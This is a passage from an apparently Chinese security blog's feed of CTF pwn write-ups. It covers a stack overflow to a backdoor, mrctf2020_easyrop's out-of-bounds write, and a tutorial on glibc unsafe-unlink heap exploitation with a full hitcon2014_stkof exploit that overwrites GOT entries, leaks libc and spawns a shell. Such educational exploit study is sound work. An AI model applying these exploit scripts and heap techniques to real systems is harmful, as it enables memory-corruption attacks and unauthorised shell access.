rax前可以追溯到rax的值来自栈上一个数据，可以去看看能不能覆盖</p><p><img src="/2021/06/05/2021-06-14-buu06/image-20210812172747784.png" alt="image-20210812172747784"></p><p><img src="/2021/06/05/2021-06-14-buu06/image-20210812172859005.png" alt="image-20210812172859005"></p><p>这里传入的rax的值就是源头，而这里的值是栈上的，并且我们是可以覆盖的，就是在第二个输入点输入密码的地方</p><p>成功getshell</p><p><img src="/2021/06/05/2021-06-14-buu06/image-20210812164617984.png" alt="image-20210812164617984"></p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">29528</span>)<br>shell = <span class="hljs-number">0x400E88</span><br><br>p.recvuntil(<span class="hljs-string">&quot;username:&quot;</span>)<br>p.sendline(<span class="hljs-string">&quot;admin&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;password:&quot;</span>)<br>payload = <span class="hljs-string">&quot;2jctf_pa5sw0rd&quot;</span>.ljust(<span class="hljs-number">0x48</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>) + p64(shell)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="mrctf2020-easyrop"><a href="#mrctf2020-easyrop" class="headerlink" title="mrctf2020_easyrop"></a>mrctf2020_easyrop</h3><p><img src="/2021/06/05/2021-06-14-buu06/image-20210812175441484.png" alt="image-20210812175441484"></p><p>checksec，64位，只开启nx</p><p><img src="/2021/06/05/2021-06-14-buu06/image-20210812180035772.png" alt="image-20210812180035772"></p><p>首先程序存在后门，但是依照逻辑是不可能运行到后门的，所以需要劫持rip执行后门函数</p><p><img src="/2021/06/05/2021-06-14-buu06/image-20210812181120347.png" alt="image-20210812181120347"></p><p>所有的输入点都是从var_310开始输入的，然而最大的输入长度也不过是0x300，不够覆盖到返回地址</p><p><img src="/2021/06/05/2021-06-14-buu06/image-20210812181040014.png" alt="image-20210812181040014"></p><p>仔细分析程序，可以发现这边有个数组越界，这里的a1是var_310，所以可以先用别的函数输入数据，然后越界覆盖返回地址为后门函数</p><p>这边有个注意点：覆盖成功后退出程序时，程序还是会执行到数组越界的函数，所以这时候的输入只能是输入一个’\x00’，并且不能含有换行符，否则会接在前面输入的后门函数的地址上，导致地址无效了</p><p>在本地成功getshell，远程的docker可能出问题了，没有反应</p><p><img src="/2021/06/05/2021-06-14-buu06/image-20210812184240747.png" alt="image-20210812184240747"></p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#p = remote(&quot;node4.buuoj.cn&quot;,26109)</span><br>p = process(<span class="hljs-string">&quot;./mrctf2020_easyrop&quot;</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-comment">#gdb.attach(p)</span><br>shell = <span class="hljs-number">0x40072A</span><br><br>p.sendline(<span class="hljs-string">&#x27;2&#x27;</span>)<br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x2ff</span> + <span class="hljs-string">&#x27;\x00&#x27;</span><br>p.sendlineafter(<span class="hljs-string">&quot;hehehehehehehe\n&quot;</span>,payload)<br>p.sendline(<span class="hljs-string">&#x27;3&#x27;</span>)<br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x19</span> + p64(shell)<br>p.sendlineafter(<span class="hljs-string">&quot;bybybybybybyby\n&quot;</span>,payload)<br>p.sendline(<span class="hljs-string">&#x27;7&#x27;</span>)<br>p.send(<span class="hljs-string">&#x27;\x00&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;bjdctf-2020-router&quot;&gt;&lt;a href=&quot;#bjdctf-2020-router&quot; class=&quot;headerlink&quot; title=&quot;bjdctf_2020_router&quot;&gt;&lt;/a&gt;bjdctf_2020_router&lt;/h3&gt;&lt;p&gt;常规chec</summary>
      
    
    
    
    
    <category term="buu" scheme="http://example.com/tags/buu/"/>
    
  </entry>
  
  <entry>
    <title>不安全的unlink</title>
    <link href="http://example.com/2021/05/30/2021-05-30-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84unlink/"/>
    <id>http://example.com/2021/05/30/2021-05-30-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84unlink/</id>
    <published>2021-05-30T01:54:04.000Z</published>
    <updated>2021-10-13T08:01:20.310Z</updated>
    
    <content type="html"><![CDATA[<p>以下知识摘自《CTF竞赛权威指南 Pwn篇》、CTF-Wiki</p><h1 id="不安全的unlike"><a href="#不安全的unlike" class="headerlink" title="不安全的unlike"></a>不安全的unlike</h1><h2 id="什么叫unlike"><a href="#什么叫unlike" class="headerlink" title="什么叫unlike"></a>什么叫unlike</h2><p>为了避免堆内存的过度碎片化，当一个堆块（非fastbin chunk）被释放时，libc会查看其前后堆块是否处于被释放的状态，如果是，则将前面或后面的堆块从bins链取出来，与当前释放堆块合并，这个取出堆块的过程就叫做unlike</p><p>基本过程如下图所示</p><p><img src="/2021/05/30/2021-05-30-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84unlink/unlink_smallbin_intro.png"></p><p>上述的操作进行了如下的赋值</p><ul><li><p>*( fd + 0x18 ) = bk</p></li><li><p>*( bk + 0x10 ) = fd</p></li></ul><h3 id="unlink中的检查"><a href="#unlink中的检查" class="headerlink" title="unlink中的检查"></a>unlink中的检查</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 由于 P 已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致(size检查)</span><br><span class="hljs-keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="hljs-number">0</span>))      \<br>      malloc_printerr (<span class="hljs-string">&quot;corrupted size vs. prev_size&quot;</span>);               \<br>      <br><span class="hljs-comment">// 检查 fd 和 bk 指针(双向链表完整性检查)</span><br><span class="hljs-keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="hljs-number">0</span>))                      \<br>  malloc_printerr (check_action, <span class="hljs-string">&quot;corrupted double-linked list&quot;</span>, P, AV);  \<br><br>  <span class="hljs-comment">// largebin 中 next_size 双向链表完整性检查 </span><br>              <span class="hljs-keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="hljs-number">0</span>)              \<br>                || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="hljs-number">0</span>))    \<br>              malloc_printerr (check_action,                                      \<br>                               <span class="hljs-string">&quot;corrupted double-linked list (not small)&quot;</span>,P, AV);  \<br></code></pre></td></tr></table></figure><h2 id="利用unlink"><a href="#利用unlink" class="headerlink" title="利用unlink"></a>利用unlink</h2><p>要利用unlink首先要绕过上面提到的两个检查：</p><ol><li><p>size检查：</p><p>在堆中有两个地方存储了P的size：第一个是当前P-&gt;size，第二个是next_chunk-&gt;prev_size，比较两者大小</p></li><li><p>fd和bk检查：</p><p>检查P是否在双向链表中，在双向链表中有两个指针指向P：第一个是FD-&gt;bk，第二个是BK-&gt;fd</p></li></ol><p>在libc-2.27.so版本，要先填满tcache bin</p><h3 id="第一种思路"><a href="#第一种思路" class="headerlink" title="第一种思路"></a>第一种思路</h3><h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4><ol><li>存在UAF可以修改P的fd和bk</li><li>存在一个指针指向P</li></ol><h4 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h4><ol><li>通过UAF漏洞修改chunk0-&gt;fd=G_ptr-0x18，chunk0-&gt;bk=G_ptr-0x10，绕过fd和bk检查</li><li>free下一个chunk，chunk0和chunk1合并，chunk0发生unlink，修改了G_ptr的值</li></ol><h4 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h4><p>修改G_ptr=&amp;G_ptr-0x18。如果能够对G_ptr指向的空间进行修改，则可能导致任意地址读写。</p><p><img src="/2021/05/30/2021-05-30-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84unlink/20201112000118623.png" alt="在这里插入图片描述"></p><h3 id="第二种思路"><a href="#第二种思路" class="headerlink" title="第二种思路"></a>第二种思路</h3><h4 id="利用条件-1"><a href="#利用条件-1" class="headerlink" title="利用条件"></a>利用条件</h4><ol><li>可以修改p的下一个chunk-&gt;pre_size和inuse位</li><li>存在一个指针指向chunk p的内容部分</li></ol><h4 id="利用方法-1"><a href="#利用方法-1" class="headerlink" title="利用方法"></a>利用方法</h4><ol><li><p>伪造fake_chunk：fakechunk-&gt;size=chunk0-0x10，可以绕过size检查</p><p>fakechunk-&gt;fd=&amp;G_ptr-0x18，fakechunk-&gt;bk = &amp;G_ptr-&gt;0x10，绕过fd和bk检查</p></li><li><p>修改下一个chunk的prev_size=chunksize-0x10。因为fakechunk比chunk0小0x10</p></li><li><p>修改下一个chunk的inuse位</p></li><li><p>free下一个堆块chunk1。fake chunk和chunk1合并，fake chunk发生unlink，修改了G_ptr的值</p></li></ol><h4 id="效果-1"><a href="#效果-1" class="headerlink" title="效果"></a>效果</h4><p>修改G_ptr=&amp;G_ptr-0x18。如果能够对G_ptr指向的空间进行修改，则可能导致任意地址读写</p><p><img src="/2021/05/30/2021-05-30-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84unlink/2020111123405646.png" alt="在这里插入图片描述"></p><h2 id="例题hitcon2014-stkof"><a href="#例题hitcon2014-stkof" class="headerlink" title="例题hitcon2014_stkof"></a>例题hitcon2014_stkof</h2><p><img src="/2021/05/30/2021-05-30-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84unlink/image-20210831204845498.png" alt="image-20210831204845498"></p><p>常规checksec一下，64位，开了NX、Canary</p><p><img src="/2021/05/30/2021-05-30-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84unlink/image-20210831211106261.png" alt="image-20210831211106261"></p><p>进入IDA，额，有个选项为4的功能似乎并没有作用，然后溢出点存在与修改函数中，对于我们能修改的长度是不存在什么限制的，所以能很轻易的造成堆溢出</p><p>题目没开PIE，所以堆结构的地址是已知的，整个程序不存在打印功能。这边的思路是：</p><p>先通过unlink把堆结构上的堆指针改为在堆结构前的地址，从而可以控制堆结构，达成任意写；然后先修改 <code>s[1] = free@got</code> 地址，同时修改 <code>s[2] = puts@got</code> 地址；再一次编辑，实现覆写free@got为puts@plt,从而当调用 free 函数时，即可直接调用 puts 函数。这样就可以泄漏函数内容。然后free(s[2])，相当于执行了puts（puts@got）通过puts泄露puts@got的值，获得libc基地址，然后就可以获得system；最后修改再把free@got修改为system，对着写有/bin/sh\x00的堆块释放</p><p><img src="/2021/05/30/2021-05-30-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84unlink/image-20210831213326412.png" alt="image-20210831213326412"></p><p>首先，这边第一个申请的chunk是不能被使用的，由于程序本身没有进行 setvbuf 操作，所以在执行输入输出操作的时候会申请缓冲区，所以我们在前面先分配一个 chunk 来把缓冲区分配完毕，以免影响之后的操作。具体的看ctfwiki这题的<a href="https://wiki.x10sec.org/pwn/linux/glibc-heap/unlink-zh/#io">IO 缓冲区问题分析</a>。所以第一个堆块不能用来做fakechunk</p><p>所以这边进行创造fake_chunk要注意！首先，堆块的索引从1开始；其次第一个不能用，所以我们要从堆结构的第二个地方作为地址</p><p><img src="/2021/05/30/2021-05-30-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84unlink/image-20210831214046823.png" alt="image-20210831214046823"></p><p><img src="/2021/05/30/2021-05-30-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84unlink/image-20210831214232302.png" alt="image-20210831214232302"></p><p>触发unlink，造成合并，同时堆结构指针的值被改为其地址 - 0x18</p><p>然后就是按照思路所说的，去修改堆结构即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./stkof&quot;</span>)<br><span class="hljs-comment">#libc = ELF(&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc-2.23.so&quot;)</span><br>libc = ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>)<br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/ld-2.23.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">28635</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size</span>):</span><br>p.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,content</span>):</span><br>p.sendline(<span class="hljs-string">&#x27;2&#x27;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br>p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(content)))<br>p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>p.sendline(<span class="hljs-string">&#x27;3&#x27;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br>puts_plt=elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got=elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>free_got=elf.got[<span class="hljs-string">&#x27;free&#x27;</span>]<br><br><br>add(<span class="hljs-number">0x80</span>) <span class="hljs-comment">#1</span><br>add(<span class="hljs-number">0x80</span>) <span class="hljs-comment">#2</span><br>add(<span class="hljs-number">0x80</span>) <span class="hljs-comment">#3</span><br>add(<span class="hljs-number">0x80</span>) <span class="hljs-comment">#4 防止合并</span><br>ptr = <span class="hljs-number">0x0000000000602150</span><br>fake_chunk = p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x81</span>) <span class="hljs-comment">#fake_chunk header</span><br>fake_chunk += p64(ptr - <span class="hljs-number">0x18</span>) + p64(ptr - <span class="hljs-number">0x10</span>) <span class="hljs-comment">#fake_chunk fd  bk</span><br>fake_chunk += <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x60</span> + p64(<span class="hljs-number">0x80</span>) + p64(<span class="hljs-number">0x90</span>) <span class="hljs-comment">#fake prev_size  size</span><br>edit(<span class="hljs-number">2</span>,fake_chunk)<br>free(<span class="hljs-number">3</span>)<br>payload = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">2</span> + p64(free_got) + p64(puts_got)<br>edit(<span class="hljs-number">2</span>,payload)<br>edit(<span class="hljs-number">1</span>,p64(puts_plt))<br>free(<span class="hljs-number">2</span>)<br>p.recv(<span class="hljs-number">0x20</span>)<br>libc_base = u64(p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)) - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>log.success(<span class="hljs-built_in">hex</span>(libc_base))<br>system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>edit(<span class="hljs-number">1</span>,p64(system))<br>edit(<span class="hljs-number">4</span>,<span class="hljs-string">&quot;/bin/sh\x00&quot;</span>)<br>free(<span class="hljs-number">4</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="新版本下的unlink"><a href="#新版本下的unlink" class="headerlink" title="新版本下的unlink"></a>新版本下的unlink</h2><p>在 glibc2.29 以上版本，glibc 在 unlink 内加入了 prevsize check。当然这个检测对于上面的unlink攻击是没有影响的，影响的是offbynull的攻击利用，不能直接通过修改size来制造堆块重叠。下面是新的检测机制源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* consolidate backward */</span><br><span class="hljs-keyword">if</span> (!prev_inuse(p)) &#123;<br>  prevsize = prev_size (p);<br>  size += prevsize;<br>  p = chunk_at_offset(p, -((<span class="hljs-keyword">long</span>) prevsize));<br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))<br>    malloc_printerr (<span class="hljs-string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);<br>  unlink_chunk (av, p);<br>&#125;<br></code></pre></td></tr></table></figure><p>具体关于offbynull带来的影响，可以移步我的另一篇博客offbyone&amp;null</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;以下知识摘自《CTF竞赛权威指南 Pwn篇》、CTF-Wiki&lt;/p&gt;
&lt;h1 id=&quot;不安全的unlike&quot;&gt;&lt;a href=&quot;#不安全的unlike&quot; class=&quot;headerlink&quot; title=&quot;不安全的unlike&quot;&gt;&lt;/a&gt;不安全的unlike&lt;/h1&gt;&lt;h</summary>
      
    
    
    
    
    <category term="unlink" scheme="http://example.com/tags/unlink/"/>
    
  </entry>
  
</feed>
